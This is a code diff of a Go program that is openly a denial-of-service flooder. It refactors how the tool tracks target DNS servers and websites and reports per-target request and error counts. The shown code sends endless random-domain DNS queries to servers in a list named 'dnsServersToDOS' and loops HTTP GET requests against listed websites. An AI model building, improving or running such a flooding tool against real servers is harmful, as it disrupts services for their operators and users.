@@ -12,7 +12,6 @@ import (
 	"net/http"
 	"net/url"
 	"os"
-	"sort"
 	"strings"
 	"sync"
 	"time"
@@ -219,7 +218,6 @@ var links = map[string]struct{}{
 }
 
 type DNSServer struct {
-	Server       string `json:"server"`
 	Requests     uint   `json:"requests"`
 	Success      uint   `json:"success"`
 	Errors       uint   `json:"errors"`
@@ -229,7 +227,6 @@ type DNSServer struct {
 }
 
 type Website struct {
-	Link         string `json:"url"`
 	Requests     uint   `json:"requests"`
 	Errors       uint   `json:"errors"`
 	LastErrorMsg string `json:"last_error_msg"`
@@ -243,8 +240,8 @@ type Website struct {
 	mux *sync.Mutex
 }
 
-var dnsServers = []*DNSServer{}
-var websites = []*Website{}
+var dnsServers = map[string]*DNSServer{}
+var websites = map[string]*Website{}
 
 var httpClient http.Client
 
@@ -260,22 +257,16 @@ var (
 func main() {
 	ff.Parse(fs, os.Args[1:], ff.WithEnvVarPrefix("SP"))
 
+	// DNS servers
 	for dnsServer := range dnsServersToDOS {
-		ds := &DNSServer{
-			Server: dnsServer,
-			mux:    &sync.Mutex{},
-		}
-		dnsServers = append(dnsServers, ds)
-		ds.Start()
+		dnsServers[dnsServer] = &DNSServer{mux: &sync.Mutex{}}
+		dnsServers[dnsServer].Start(dnsServer)
 	}
 
+	// Websites
 	for link := range links {
-		w := &Website{
-			Link: link,
-			mux:  &sync.Mutex{},
-		}
-		websites = append(websites, w)
-		w.Start()
+		websites[link] = &Website{mux: &sync.Mutex{}}
+		websites[link].Start(link)
 	}
 
 	http.HandleFunc("/status", status)
@@ -284,59 +275,53 @@ func main() {
 }
 
 type StatusStruct struct {
-	DNS      []DNSServer `json:"DNS"`
-	Websites []Website   `json:"Websites"`
+	DNS      map[string]*DNSServer `json:"DNS"`
+	Websites map[string]*Website   `json:"Websites"`
 
 	mux *sync.Mutex
 }
 
 func status(w http.ResponseWriter, req *http.Request) {
 	statusStruct := StatusStruct{
-		DNS:      []DNSServer{},
-		Websites: []Website{},
-		mux:      &sync.Mutex{},
+		DNS:      make(map[string]*DNSServer, len(dnsServers)),
+		Websites: make(map[string]*Website, len(websites)),
+
+		mux: &sync.Mutex{},
 	}
 
 	wg := sync.WaitGroup{}
 	wg.Add(len(dnsServers))
 	wg.Add(len(websites))
 
-	for _, ds := range dnsServers {
-		go func(ds *DNSServer) {
+	for endpoint, ds := range dnsServers {
+		go func(endpoint string, ds *DNSServer) {
 			ds.mux.Lock()
 			dnsServer := *ds
 			ds.mux.Unlock()
 
 			statusStruct.mux.Lock()
-			statusStruct.DNS = append(statusStruct.DNS, dnsServer)
+			statusStruct.DNS[endpoint] = &dnsServer
 			statusStruct.mux.Unlock()
 
 			wg.Done()
-		}(ds)
+		}(endpoint, ds)
 	}
 
-	for _, ws := range websites {
-		go func(ws *Website) {
+	for endpoint, ws := range websites {
+		go func(endpoint string, ws *Website) {
 			ws.mux.Lock()
 			tmpWebsite := *ws
 			ws.mux.Unlock()
 
 			statusStruct.mux.Lock()
-			statusStruct.Websites = append(statusStruct.Websites, tmpWebsite)
+			statusStruct.Websites[endpoint] = &tmpWebsite
 			statusStruct.mux.Unlock()
 
 			wg.Done()
-		}(ws)
+		}(endpoint, ws)
 	}
 
 	wg.Wait()
-
-	sort.Slice(statusStruct.DNS, func(i, j int) bool {
-		return strings.Compare(statusStruct.DNS[i].Server, statusStruct.DNS[j].Server) <= 0
-	})
-	sort.Slice(statusStruct.Websites, func(i, j int) bool {
-		return strings.Compare(statusStruct.Websites[i].Link, statusStruct.Websites[j].Link) <= 0
-	})
 
 	content, err := json.MarshalIndent(statusStruct, "", "    ")
 	if err != nil {
@@ -347,7 +332,7 @@ func status(w http.ResponseWriter, req *http.Request) {
 	w.Write(content)
 }
 
-func (ds *DNSServer) Start() {
+func (ds *DNSServer) Start(endpoint string) {
 	c := new(dns.Client)
 	c.Dialer = &net.Dialer{
 		Timeout: *flagTimeout,
@@ -358,7 +343,7 @@ func (ds *DNSServer) Start() {
 			domain := getRandomDomain()
 			m := new(dns.Msg)
 			m.SetQuestion(domain+".", dns.TypeAAAA)
-			_, _, err := c.Exchange(m, ds.Server)
+			_, _, err := c.Exchange(m, endpoint)
 
 			ds.mux.Lock()
 			ds.Requests++
@@ -377,8 +362,8 @@ func (ds *DNSServer) Start() {
 	}
 }
 
-func (ws *Website) Start() {
-	websiteURL, err := url.Parse(ws.Link)
+func (ws *Website) Start(endpoint string) {
+	websiteURL, err := url.Parse(endpoint)
 	if err != nil {
 		panic(err)
 	}
@@ -386,7 +371,7 @@ func (ws *Website) Start() {
 	f := func() {
 		for {
 			// Create request
-			req, err := http.NewRequest("GET", ws.Link, nil)
+			req, err := http.NewRequest("GET", endpoint, nil)
 			if err != nil {
 				panic(err)
 			}
